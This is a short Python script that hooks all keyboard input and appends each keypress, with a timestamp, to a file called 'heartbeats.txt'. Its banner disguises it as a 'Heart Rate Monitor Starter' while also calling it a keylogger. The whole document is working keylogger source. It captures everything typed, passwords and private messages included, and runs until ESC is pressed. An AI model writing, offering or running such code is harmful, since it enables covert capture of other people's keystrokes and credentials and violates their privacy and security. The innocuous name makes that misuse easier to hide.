import keyboard
import time
import os
import sys 

OUTPUT_FILE = "heartbeats.txt"

def procesar_pulsacion(key_event):
    
    if key_event.event_type == keyboard.KEY_DOWN:
        k_name = key_event.name
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        
        entry = ""
        
        if len(k_name) > 1:
            entry = f"[{timestamp}] [{k_name.upper()}]\n"
        else:
            entry = f"[{timestamp}] Tecla: '{k_name}'\n"

        print(f"Log: {entry.strip()}")
        sys.stdout.flush() 
        try:
            with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
                f.write(entry)
        except Exception as err:
            
            print(f"[ERROR] Could not write to the file '{OUTPUT_FILE}': {err}")

def iniciar_registro():
   

    print("=" * 50)
    print("   Heart Rate Monitor Starter (Keylogger)")
    print("=" * 50)
  
    

    file_path = os.path.abspath(OUTPUT_FILE)
    print(f"[INFO] The registration will start now.")
    print(f"[INFO] Destination file: {file_path}")
    print(f"[INFO] Press the 'ESC' key to exit the program.")

    try:
        keyboard.hook(procesar_pulsacion)
        
    
        keyboard.wait('esc')
        
    except KeyboardInterrupt:
        print("\n[END] Manual stop with Ctrl+C.")
    except Exception as e:
        print(f"\n[ERROR] An unexpected error occurred: {e}")
    finally:
        keyboard.unhook_all()
        print("\n[END] Keylogger stopped. Check the log file.")

if __name__ == "__main__":
    iniciar_registro()
